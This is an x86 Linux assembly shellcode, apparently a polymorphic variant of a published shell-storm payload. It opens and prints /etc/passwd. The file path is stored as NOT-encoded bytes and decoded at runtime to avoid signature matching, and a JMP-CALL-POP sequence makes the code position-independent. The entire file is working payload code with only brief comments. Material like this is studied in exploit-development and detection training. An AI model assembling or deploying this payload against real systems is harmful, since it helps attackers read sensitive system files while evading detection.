; Original: http://shell-storm.org/shellcode/files/shellcode-73.php 
; Polymorphic read /etc/passwd

global _start


_start:
	xor	eax, eax
	mov	ebx, eax
	mov	ecx, eax
	mov	edx, eax
	jmp	two



one:
	pop	ebx
	
	; Decode string
	mov 	cl, 11		; File path length
decode:
	not byte [ebx]
	inc ebx
	loop decode
	sub 	ebx, 11		; Restore the address string


	mov	al, 5
	xor	ecx, ecx
	int	0x80
	
	mov	esi, eax
	jmp	read

exit:
	mov	al, dl 		; dl = 1
	xor	ebx, ebx
	int	0x80

read:
	mov	ebx, esi
	mov	al, 3
	sub	esp, 1
	lea	ecx, [esp]
	mov	dl, 1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	;mov	al, 4
	mov	bl, 1
	mov al, bl
	add al, 3
	mov	dl, bl
	int	0x80
	
	add	esp, 1
	jmp	read

two:
	call one
	.string db 0xd0,0x9a,0x8b,0x9c,0xd0,0x8f,0x9e,0x8c,0x8c,0x88,0x9b	; Encoded string with not 
